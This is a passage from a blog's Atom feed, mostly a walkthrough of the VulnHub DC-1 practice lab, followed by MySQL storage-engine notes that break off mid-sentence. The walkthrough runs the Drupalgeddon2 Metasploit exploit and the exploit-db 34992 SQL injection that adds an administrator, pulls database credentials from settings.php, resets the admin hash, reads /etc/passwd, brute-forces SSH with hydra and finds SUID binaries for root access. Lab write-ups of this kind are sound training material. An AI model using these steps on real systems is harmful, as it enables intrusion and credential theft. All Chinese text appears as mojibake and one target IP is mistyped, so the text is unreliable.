    <content type="html"><![CDATA[<p>é¶æœºä½¿ç”¨VMwareæ­å»ºï¼Œç½‘ç»œä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œä¹Ÿå¯ä½¿ç”¨NATæ¨¡å¼</p><p>æ“ä½œä¸éš¾ï¼Œä¸»è¦å­¦æ€è·¯å’Œæ–¹æ³•ï¼Œè€æ˜¯çœ‹åˆ«äººæ¸—é€æ“ä½œæ„Ÿè§‰æˆ‘ä¸Šæˆ‘ä¹Ÿè¡Œï¼Œä½†å®é™…ä¸Šè‡ªå·±çœŸæ­£çš„æ¥æ“ä½œäº†å°±çŸ¥é“äº†ï¼Œè¶Šåˆ°åé¢å°±è¶Šä¸çŸ¥é“ä»ä½•å…¥æ‰‹ã€‚ã€‚ã€‚</p><p>é¶æœºï¼š192.168.99.170ï¼ˆDC-1ï¼‰ï¼Œ<a href="https://www.vulnhub.com/entry/dc-1,292/">vulnhubåœ°å€</a></p><p>æ¸—é€æœºï¼š192.168.99.188ï¼ˆKaliï¼‰</p><p>ç‰©ç†ä¸»æœºï¼š192.168.99.107ï¼ˆWindows10ï¼‰</p><p>ç›®æ ‡ï¼šå°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„flag</p><p>nmapä¸»æœºå‘ç°ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sP -PR 192.168.99.1&#x2F;24-sP: Ping Scan - go no further than determining if host is online-PR: ARP Ping</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501114628048.png" alt loading="lazy"></p><p>æ‰¾åˆ°é¶æœºåœ°å€ï¼Œå¯¹é¶æœºç«¯å£è¿›è¡Œæ‰«æï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo nmap -T4 -A -sN 192.168.99.170-sN: TCP Null, FIN, and Xmas scans-A: Enables OS detection and Version detection</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501115129119.png" alt loading="lazy"></p><p>æŸ¥çœ‹80ç«¯å£æœ‰httpæœåŠ¡å¼€æ”¾ï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªDrupalç«™ç‚¹ï¼Œç‰ˆæœ¬ä¸ºDrupal 7ï¼Œç½‘ä¸Šæœæœ‰18å¹´çš„ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7600ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155026635.png" alt loading="lazy"></p><p>ä¸Šmsfï¼Œ<code>search drupal</code>ï¼Œç”¨18å¹´çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155618792.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.169.99.170exploit</code></pre><p>æˆåŠŸå¼¹å›ä¸€ä¸ªshell</p><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯<code>sysinfo</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501164905497.png" alt loading="lazy"></p><p>è¿›å…¥ç³»ç»Ÿshellï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸ºwww-data</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165519887.png" alt loading="lazy"></p><p>æœé›†ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501161345481.png" alt loading="lazy"></p><p>æ‹¿åˆ°flag1ï¼Œ<code>Every good CMS needs a config file - and so do you.</code>ï¼Œæ ¹æ®æç¤ºæ‰¾é…ç½®æ–‡ä»¶</p><p><code>search -f setting*</code> æˆ–<code>find . -type f | xargs grep &quot;password&quot;</code>æ‰¾settingå¼€å¤´çš„æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163530112.png" alt loading="lazy"></p><p><code>download ./sites/default/settings.php /home/kali/</code>ä¸‹è½½ä¸‹æ¥çœ‹çœ‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163755265.png" alt loading="lazy"></p><p>æ‹¿åˆ°flag2ï¼Œæ•°æ®åº“ç”¨æˆ·è´¦å·å¯†ç </p><pre class="language-none"><code class="language-none">dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?&#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,&#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</code></pre><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>è¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œä¸ºä»€ä¹ˆè¦ç”¨äº¤äº’å¼shellï¼Œå› ä¸ºéäº¤äº’shellæ— å›æ˜¾ï¼Œ<a href="https://blog.csdn.net/gui951753/article/details/79154496">è¯¦è§</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165847912.png" alt loading="lazy"></p><p><code>mysql -udbuser -pR0ck3t</code>ç™»å½•<code>mysql</code>å‘½ä»¤è¡Œ</p><p><code>select * from users \G;</code> </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202239805.png" alt loading="lazy"></p><p>adminå¯†ç åŠ å¯†çš„ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥æ‹¿åˆ°åå°ç®¡ç†å‘˜çš„è´¦å·</p><p>ä¸€ä¸ªæ˜¯æŠŠæ•°æ®åº“ä¸­adminçš„å¯†ç ç»™æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å¯†ç ï¼Œå‰ææ˜¯è¦ç»è¿‡<code>Drupal</code>åç«¯åŠ å¯†çš„æ‰è¡Œ</p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•<code>scripts</code>æ‰¾åˆ°åŠ å¯†è„šæœ¬ï¼Œ<a href="http://drupalchina.cn/node/2128">å‚è€ƒ</a></p><p>æ‰§è¡ŒåŠ å¯†è„šæœ¬<code>php scripts/password-hash.sh 123456</code>ï¼Œå¾—åˆ°<code>123456</code>åŠ å¯†åçš„å¯†ç <code>$S$DO3Rg8SH1xaO3lXuF8sKc8905t0xwoMMO80Ikju//Ia1JwdtrWz5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202852481.png" alt loading="lazy"></p><p>åœ¨æ•°æ®åº“ä¸­<code>update</code>ç®¡ç†å‘˜çš„å¯†ç ï¼Œå³å¯ç”¨æ›´æ”¹åçš„å¯†ç ç™»å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501203540144.png" alt loading="lazy"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œ<code>searchsploit drupal</code>å‘ç°<code>Drupal 7.0 &lt; 7.31</code>ç‰ˆæœ¬å­˜åœ¨SQLæ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†å‘˜è´¦å·ï¼Œ<a href="https://www.exploit-db.com/exploits/34992">è¯¦è§</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204048208.png" alt loading="lazy"></p><p><code>python 34992.py -t http://192.168.99.170 -u extrader -p 123456</code> å³å¯æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</p><p>ç™»å½•åå°</p><p>contenté‡Œæ‰¾åˆ°flag3</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204137968.png" alt loading="lazy"></p><p>æš—ç¤º<code>shadow</code>ï¼Œ<code>cat /etc/passwd</code>ï¼Œå‘ç°flag4ç”¨æˆ·</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204348304.png" alt loading="lazy"></p><p>åœ¨<code>/home/flag4</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>flag4.txt</code>æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501162541392.png" alt loading="lazy"></p><p>è¿™é‡Œè¿˜å¯ä»¥ç”¨<code>hydra</code>çˆ†ç ´flag4çš„å¯†ç ï¼Œè™½ç„¶æ²¡å•¥ç”¨ï¼Œå­¦æ“ä½œå°±å¤Ÿäº†</p><pre class="language-none"><code class="language-none">-l æŒ‡å®šç”¨æˆ·å-P åŠ è½½å¯†ç å­—å…¸ï¼ˆè‡ªå®šä¹‰)ssh:&#x2F;&#x2F;ip æŒ‡å®šä½¿ç”¨åè®®å’Œipåœ°å€</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210421392.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210913760.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">Can you use this same method to find or access the flag in root?Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></pre><p>æ„æ€è¦æˆ‘ä»¬ææƒ</p><p>suidææƒ</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>æ‰¾åˆ°ä¸€ä¸ªå±äºrootçš„æœ‰sæƒé™çš„æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205439109.png" alt loading="lazy"></p><p>ææƒï¼Œåœ¨<code>/root</code>ç›®å½•ä¸‹æ‹¿åˆ°æœ€ç»ˆçš„flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205503876.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;é¶æœºä½¿ç”¨VMwareæ­å»ºï¼Œç½‘ç»œä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œä¹Ÿå¯ä½¿ç”¨NATæ¨¡å¼&lt;/p&gt;
&lt;p&gt;æ“ä½œä¸éš¾ï¼Œä¸»è¦å­¦æ€è·¯å’Œæ–¹æ³•ï¼Œè€æ˜¯çœ‹åˆ«äººæ¸—é€æ“ä½œæ„Ÿè§‰æˆ‘ä¸Šæˆ‘ä¹Ÿè¡Œï¼Œä½†å®é™…ä¸Šè‡ªå·±çœŸæ­£çš„æ¥æ“ä½œäº†å°±çŸ¥é“äº†ï¼Œè¶Šåˆ°åé¢å°±è¶Šä¸çŸ¥é“ä»ä½•å…¥æ‰‹ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;é¶æœºï¼š192.168.99.170ï¼ˆDC-1ï¼‰ï¼Œ&lt;a
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="é¶æœº" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MySQLå­¦ä¹ ç¬”è®°</title>
    <link href="https://www.extrader.top/posts/f12cbde5/"/>
    <id>https://www.extrader.top/posts/f12cbde5/</id>
    <published>2021-04-09T05:17:01.000Z</published>
    <updated>2021-04-10T12:08:09.609Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MySQLå­˜å‚¨å¼•æ“"><a href="#MySQLå­˜å‚¨å¼•æ“" class="headerlink" title="MySQLå­˜å‚¨å¼•æ“"></a>MySQLå­˜å‚¨å¼•æ“</h3><p>å­˜å‚¨å¼•æ“æ˜¯MySQLç»„ä»¶ï¼Œç”¨äºå¤„ç†ä¸åŒç±»å‹çš„SQLæ“ä½œã€‚</p><p>ä½¿ç”¨ <a href="https://dev.mysql.com/doc/refman/5.7/en/show-engines.html"><code>SHOW ENGINES</code></a> è¯­å¥æŸ¥çœ‹æœåŠ¡å™¨æ”¯æŒå“ªäº›å­˜å‚¨å¼•æ“ï¼ŒSupportåˆ—ä¸­è¡¨ç¤ºæ˜¯å¦å¯ä»¥ä½¿ç”¨ï¼ŒDEFAULTè¡¨ç¤ºé»˜è®¤å€¼ã€‚ï¼ˆä¸‹å›¾ç‰ˆæœ¬ä¸ºMySQL 5.7.26ï¼ŒWindows 10ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409135417092.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html"><code>InnoDB</code></a> æ˜¯é»˜è®¤çš„ä¸”ç”¨é€”æœ€å¹¿çš„å­˜å‚¨å¼•æ“ï¼ŒOracleå®˜æ–¹å»ºè®®å°†å…¶ç”¨äºè¡¨ï¼ˆç‰¹æ®Šç”¨ä¾‹é™¤å¤–ï¼‰ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹ ï¼ŒMySQL 5.7 or MySQL 8.0 ä¸­ä½¿ç”¨  <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> è¯­å¥åˆ›å»º<code>InnoDB</code>è¡¨ã€‚ï¼‰</p><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><p>äº‹åŠ¡å‹æ•°æ®åº“çš„é¦–é€‰å¼•æ“ï¼Œæ”¯æŒäº‹åŠ¡å®‰å…¨ï¼ˆACIDï¼‰ï¼Œå…·æœ‰æäº¤ï¼ˆCOMMITï¼‰ï¼Œå›æ»šï¼ˆROLLBACKï¼‰å’Œå¥”æºƒæ¢å¤ï¼ˆcrash-recoveryï¼‰åŠŸèƒ½ <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-acid.html">InnoDB and the ACID Model</a></p><p>è¡Œçº§é”å®šå’ŒOracleé£æ ¼çš„ä¸€è‡´è¯»å–å¯æé«˜å¤šç”¨æˆ·çš„å¹¶å‘æ€§å’Œæ€§èƒ½ <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking-transaction-model.html">InnoDB Locking and Transaction Model</a></p><p>InnoDBå°†æ•°æ®å­˜æ”¾åœ¨ç£ç›˜ä¸Šï¼Œä»¥åŸºäºä¸»é”®ä¼˜åŒ–æŸ¥è¯¢ï¼Œæ¯ä¸ªInnoDBè¡¨éƒ½æœ‰ä¸€ä¸ªç§°ä¸ºèšé›†ç´¢å¼•ï¼ˆThe Clustered Indexï¼‰çš„ä¸»é”®ç´¢å¼•ï¼Œè¯¥ç´¢å¼•ç»„ç»‡æ•°æ®ä»¥æœ€å°åŒ–ä¸»é”®æŸ¥æ‰¾<code>I/O</code> <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html">Clustered and Secondary Indexes</a></p><p>ä¸ºäº†ä¿æŒæ•°æ®çš„å®Œæ•´æ€§ï¼ŒInnoDBæ”¯æŒ <code>FOREIGN KEY</code> çº¦æŸï¼Œä½¿ç”¨å¤–é”®æ£€æŸ¥æ’å…¥ï¼Œæ›´æ–°å’Œåˆ é™¤ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šå¯¼è‡´ç›¸å…³è¡¨ä¹‹é—´çš„ä¸ä¸€è‡´ã€‚ <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html">FOREIGN KEY Constraints</a></p><p><strong>ACID</strong></p><ul><li><p>åŸå­æ€§ï¼ˆAtomicityï¼‰</p><p>ä¸€ä¸ªäº‹åŠ¡è¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å›æ»šå¤±è´¥ï¼Œä¸èƒ½åªæ‰§è¡Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œ</p></li><li><p>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</p><p>äº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ç ´åæ•°æ®åº“çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ï¼Œåœ¨ä¸€ä¸ªäº‹åŠ¡åœ¨æ‰§è¡Œå‰åï¼Œæ•°æ®åº“éƒ½å¿…é¡»å¤„äºä¸€è‡´æ€§çŠ¶æ€ï¼Œä»¥é˜²æ­¢æ•°æ®å´©æºƒ</p></li><li><p>éš”ç¦»æ€§ï¼ˆIsolationï¼‰</p><p>åœ¨å¹¶å‘çš„ç¯å¢ƒä¸­ï¼Œå¹¶å‘äº‹åŠ¡æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡ç›´æ¥ä¸èƒ½äº’ç›¸å¹²æ‰°</p></li><li><p>æŒä¹…æ€§ï¼ˆDurabilityï¼‰</p><p>ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å¯¹åº”æ•°æ®åº“ä¸­çš„æ•°æ®çŠ¶æ€çš„å˜æ›´å°±ä¼šæ°¸ä¹…çš„ä¿å­˜åˆ°æ•°æ®åº“ä¸­</p></li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœéœ€è¦äº‹åŠ¡æ”¯æŒï¼Œå¹¶ä¸”æœ‰è¾ƒé«˜çš„å¹¶å‘è¯»å–é¢‘ç‡ï¼ŒInnoDBé¦–é€‰</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p>æ‰€æœ‰æ•°æ®å€¼é¦–å…ˆå­˜å‚¨åœ¨ä½å­—èŠ‚ä¸­ï¼ˆThe Low Byte Firstï¼‰ï¼Œè¿™ä½¿å¾—MyISAMç‹¬ç«‹äºæ“ä½œç³»ç»Ÿï¼Œå¯ä»¥è½»æ¾åœ°å°†å…¶ä»WindowsæœåŠ¡å™¨ç§»æ¤åˆ°LinuxæœåŠ¡å™¨</p><p>æ¯ä¸ª<code>MyISAM</code>è¡¨éƒ½ä»¥ä¸‰ä¸ªæ–‡ä»¶å­˜å‚¨åœ¨ç£ç›˜ä¸Šã€‚è¿™äº›æ–‡ä»¶å…·æœ‰ä»¥è¡¨åå¼€å¤´çš„åç§°ï¼Œå¹¶å…·æœ‰ç”¨äºæŒ‡ç¤ºæ–‡ä»¶ç±»å‹çš„æ‰©å±•åï¼Œ<code>.frm</code> æ–‡ä»¶å­˜å‚¨è¡¨æ ¼å¼ï¼Œ<code>.MYD</code>ï¼ˆMYDataï¼‰æ–‡ä»¶å­˜å‚¨æ•°æ®ï¼Œ<code>.MYI</code>ï¼ˆMYIndexï¼‰å­˜å‚¨ç´¢å¼•</p><p>æ”¯æŒå¹¶å‘æ’å…¥ï¼Œå³é€‚åˆåœ¨æ’å…¥å¯†é›†å‹è¡¨ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚ç®¡ç†é‚®ä»¶æˆ–WebæœåŠ¡å™¨æ—¥å¿—æ•°æ®</p><p>MyISAMå­˜å‚¨å¼•æ“åœ¨ç­›é€‰å¤§é‡æ•°æ®æ—¶éå¸¸è¿…é€Ÿï¼Œé€‚åˆæ’å…¥å¯†é›†å‹è¡¨</p><h4 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h4><p>å°†æ‰€æœ‰æ•°æ®å­˜å‚¨åœ¨RAMä¸­ï¼Œä»¥ä¾¿åœ¨éœ€è¦å¿«é€ŸæŸ¥æ‰¾éå…³é”®æ•°æ®çš„ç¯å¢ƒä¸­è¿›è¡Œå¿«é€Ÿè®¿é—®ï¼Œå½“mysqldå®ˆæŠ¤è¿›ç¨‹å´©æºƒæ—¶ï¼Œæ‰€æœ‰çš„Memoryæ•°æ®éƒ½ä¼šä¸¢å¤±ã€‚</p><p>è¦æ±‚å­˜å‚¨åœ¨Memoryæ•°æ®è¡¨é‡Œçš„æ•°æ®ä½¿ç”¨çš„æ˜¯é•¿åº¦ä¸å˜çš„æ ¼å¼ï¼Œä¸æ”¯æŒå¯å˜é•¿åº¦æ•°æ®ç±»å‹ï¼ˆåŒ…æ‹¬BLOBå’ŒTEXTï¼‰ï¼ŒVARCHARæ˜¯ä¸€ç§é•¿åº¦å¯å˜çš„ç±»å‹ï¼Œä½†å› ä¸ºå®ƒåœ¨MySQLå†…éƒ¨å½“åšé•¿åº¦å›ºå®šä¸å˜çš„CHARç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ã€‚</p><p>ä¸€èˆ¬åœ¨ç›®æ ‡æ•°æ®è¾ƒå°ï¼Œè€Œä¸”è®¿é—®éå¸¸é¢‘ç¹é€‚åˆä½¿ç”¨ï¼Œé€ æˆå†…å­˜çš„ä½¿ç”¨å¯ä»¥é€šè¿‡å‚æ•°<code>max_help_table_size</code>æ§åˆ¶<code>Memory</code>è¡¨çš„å¤§å°ï¼Œå¦‚æœæ•°æ®æ˜¯ä¸´æ—¶çš„ï¼Œè€Œä¸”è¦æ±‚å¿…é¡»è¢«ç«‹å³ä½¿ç”¨ï¼Œå°±å¯ä»¥å­˜æ”¾åœ¨å†…å­˜è¡¨ä¹‹ä¸­ï¼Œè‹¥æ•°æ®ä¸¢å¤±ï¼Œä¸ä¼šå¯¹åº”ç”¨æœåŠ¡äº§ç”Ÿå®è´¨çš„è´Ÿé¢å½±å“ï¼ŒMemoryåŒæ—¶æ”¯æŒæ•£åˆ—ç´¢å¼•å’ŒBæ•°ç´¢å¼•ã€‚</p><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><p>å®é™…ä¸Šæ˜¯å¸¦æœ‰é€—å·åˆ†éš”ç¬¦çš„æ–‡æœ¬æ–‡ä»¶ï¼ŒCVSè¡¨å…è®¸ä»¥CSVæ ¼å¼å¯¼å…¥æˆ–è½¬å‚¨æ•°æ®ï¼Œä»¥ä¾¿ä¸è¯»å–å’Œå†™å…¥ç›¸åŒæ ¼å¼çš„è„šæœ¬å’Œåº”ç”¨ç¨‹åºäº¤æ¢æ•°æ®ã€‚</p><p>CSV å­˜å‚¨å¼•æ“å› ä¸ºè‡ªèº«æ–‡ä»¶æ ¼å¼çš„åŸå› ï¼Œæ‰€æœ‰åˆ—å¿…é¡»å¼ºåˆ¶æŒ‡å®š NOT NULL ã€‚</p><p>CSV å­˜å‚¨å¼•æ“ä¹Ÿä¼šåŒ…å«ä¸€ä¸ªå­˜å‚¨è¡¨ç»“æ„çš„ .frm æ–‡ä»¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ª .csv å­˜å‚¨æ•°æ®çš„æ–‡ä»¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªåŒåçš„å…ƒä¿¡æ¯æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ‰©å±•åä¸º .CSM ï¼Œç”¨æ¥ä¿å­˜è¡¨çš„çŠ¶æ€åŠè¡¨ä¸­ä¿å­˜çš„æ•°æ®é‡ã€‚æ¯ä¸ªæ•°æ®è¡Œå ç”¨ä¸€ä¸ªæ–‡æœ¬è¡Œã€‚</p><h4 id="ARCHIVE"><a href="#ARCHIVE" class="headerlink" title="ARCHIVE"></a>ARCHIVE</h4><p>å½’æ¡£ï¼Œä»…æ”¯æŒæœ€åŸºæœ¬çš„æ’å…¥å’ŒæŸ¥è¯¢ä¸¤ç§åŠŸèƒ½ï¼ŒMySQL 5.5ä»¥åçš„ç‰ˆæœ¬ä¸­å¼€å§‹æ”¯æŒç´¢å¼•ï¼ŒArchiveæ‹¥æœ‰å¾ˆå¥½çš„å‹ç¼©æœºåˆ¶ï¼Œå®ƒä½¿ç”¨zlibå‹ç¼©åº“ï¼Œåœ¨è®°å½•è¢«è¯·æ±‚æ—¶ä¼šå®æ—¶å‹ç¼©ï¼Œæ‰€ä»¥å®ƒç»å¸¸è¢«ç”¨æ¥å½“åšä»“åº“ä½¿ç”¨ã€‚</p><h4 id="BLACKHOLE"><a href="#BLACKHOLE" class="headerlink" title="BLACKHOLE"></a>BLACKHOLE</h4><p>é»‘æ´å­˜å‚¨å¼•æ“ï¼Œæ‰€æœ‰æ’å…¥çš„æ•°æ®å¹¶ä¸ä¼šä¿å­˜ï¼ŒBLACKHOLE å¼•æ“è¡¨æ°¸è¿œä¿æŒä¸ºç©ºï¼Œå†™å…¥çš„ä»»ä½•æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚</p><h3 id="InnoDBåº•å±‚åŸç†"><a href="#InnoDBåº•å±‚åŸç†" class="headerlink" title="InnoDBåº•å±‚åŸç†"></a>InnoDBåº•å±‚åŸç†</h3><p>æ¶æ„å›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409171932233.png" alt loading="lazy"></p><h4 id="Buffer-Pool"><a href="#Buffer-Pool" class="headerlink" title="Buffer Pool"></a>Buffer Pool</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">ç¼“å†²æ± </a></p><p>InnoDBä¸ºäº†åšæ•°æ®çš„æŒä¹…åŒ–ï¼Œä¼šå°†æ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ä½†æ˜¯é¢å¯¹å¤§é‡çš„è¯·æ±‚æ—¶ï¼ŒCPUçš„å¤„ç†é€Ÿåº¦å’Œç£ç›˜çš„IOé€Ÿåº¦ä¹‹é—´å·®è·å¤ªå¤§ï¼Œä¸ºäº†æé«˜æ•´ä½“çš„æ•ˆç‡ï¼Œ InnoDBå¼•å…¥äº†<strong>ç¼“å†²æ± </strong>ã€‚</p><p>ç¼“å†²æ± æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªåŒºåŸŸï¼Œåœ¨InnoDBè®¿é—®è¡¨å’Œç´¢å¼•æ•°æ®çš„æ—¶å€™ä¼šåœ¨å…¶ä¸­è¿›è¡Œé«˜é€Ÿç¼“å­˜ï¼Œç¼“å†²æ± å…è®¸ç›´æ¥ä»å†…å­˜è®¿é—®ç»å¸¸ä½¿ç”¨çš„æ•°æ®ï¼Œä»è€ŒåŠ å¿«äº†å¤„ç†é€Ÿåº¦ã€‚åœ¨ä¸“ç”¨æœåŠ¡å™¨ä¸Šï¼Œé€šå¸¸å°†å¤šè¾¾80ï¼…çš„ç‰©ç†å†…å­˜åˆ†é…ç»™ç¼“å†²æ± ã€‚</p><p>ä¸ºäº†æé«˜å¤§å®¹é‡è¯»å–æ“ä½œçš„æ•ˆç‡ï¼Œç¼“å†²æ± è¢«åˆ’åˆ†ä¸ºå¤šä¸ªé¡µé¢ï¼Œè¿™äº›é¡µé¢å¯ä»¥æ½œåœ¨åœ°å®¹çº³å¤šè¡Œï¼Œä¸ºäº†æé«˜ç¼“å­˜ç®¡ç†çš„æ•ˆç‡ï¼Œä½¿ç”¨æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰ç®—æ³•çš„å˜ä½“ï¼Œå°†å¾ˆå°‘ä½¿ç”¨çš„æ•°æ®ä»ç¼“å­˜ä¸­è€åŒ–æ‰ã€‚</p><p>å¦‚ä½•åˆ©ç”¨ç¼“å†²æ± å°†ç»å¸¸è®¿é—®çš„æ•°æ®ä¿ç•™åœ¨å†…å­˜ä¸­æ˜¯MySQLè°ƒä¼˜çš„é‡è¦æ–¹é¢ã€‚</p><h4 id="Buffer-Pool-LRU-Algorithm"><a href="#Buffer-Pool-LRU-Algorithm" class="headerlink" title="Buffer Pool LRU Algorithm"></a>Buffer Pool LRU Algorithm</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">ç¼“å†²æ± LRUç®—æ³•</a></p><p>ç¼“å†²æ± ä½¿ç”¨LRUç®—æ³•çš„å˜ä½“ä½œä¸ºåˆ—è¡¨è¿›è¡Œç®¡ç†ã€‚å½“éœ€è¦ç©ºé—´ä»¥å°†æ–°é¡µé¢æ·»åŠ åˆ°ç¼“å†²æ± æ—¶ï¼Œå°†é©±é€æœ€è¿‘ä½¿ç”¨æœ€å°‘çš„é¡µé¢ï¼Œå¹¶å°†æ–°é¡µé¢æ·»åŠ åˆ°åˆ—è¡¨çš„ä¸­é—´ã€‚æ­¤ä¸­ç‚¹æ’å…¥ç­–ç•¥å°†åˆ—è¡¨è§†ä¸ºä¸¤ä¸ªå­åˆ—è¡¨ï¼š</p><ul><li><p>æœ€å‰é¢æ˜¯æœ€è¿‘è®¿é—®è¿‡çš„æ–°é¡µé¢ï¼ˆâ€œå¹´è½»â€ï¼‰ çš„å­åˆ—è¡¨</p></li><li><p>åœ¨æœ«å°¾ï¼Œæ˜¯æœ€è¿‘è®¿é—®è¿‡çš„æ—§é¡µé¢çš„å­åˆ—è¡¨</p></li></ul><p>å®˜æ–¹ç»“æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-buffer-pool-list.png" alt loading="lazy"></p><ul><li>3/8çš„ç¼“å­˜æ± ä¸“ç”¨äºæ—§çš„å­åˆ—è¡¨</li><li>åˆ—è¡¨ä¸­ç‚¹æ˜¯æ–°å­åˆ—è¡¨çš„å°¾éƒ¨ä¸æ—§å­åˆ—è¡¨çš„å¤´éƒ¨ç›¸äº¤çš„ç•Œé¢</li><li>å½“InnoDBå°†é¡µé¢è¯»å…¥ç¼“å†²æ± 